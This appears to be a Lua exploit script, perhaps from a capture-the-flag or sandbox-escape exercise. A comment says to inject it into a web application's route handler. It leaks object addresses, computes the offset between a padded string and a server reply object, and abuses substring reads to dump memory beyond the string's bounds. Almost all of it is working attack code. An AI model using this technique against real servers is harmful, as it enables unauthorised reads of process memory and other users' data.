BIGSTRING = "CAFEBABE" .. string.rep("A",33)

-- return address of Lua object
function getaddr(value)
  return tonumber(string.format("%p",value))
end

local function hexdump(data)
  for i=1, #data do
    char = string.sub(data,i,i)
    io.write(string.format("%02x", string.byte(char)) .. " ")
  end
  print()
end

-- convert the given string to byte ordered hex string
local function to_bo_hex(ins)
  v = ""
  for i=1, #ins do
    char = string.sub(ins,i,i)
    v = string.format("%02x", string.byte(char)) .. v
  end
  return v
end

-- inject the following code somewhere in a route handler

-- calculate distance between our str and reply
distance = (getaddr(final)-getaddr(BIGSTRING))-24

-- read address of reply str
outp = to_bo_hex(BIGSTRING:sub(distance+9, distance+16))
outp = tonumber(outp,16)

-- read string and dump
str = (outp-getaddr(BIGSTRING))-23
hexdump(BIGSTRING:sub(str, str+final:vlen()))
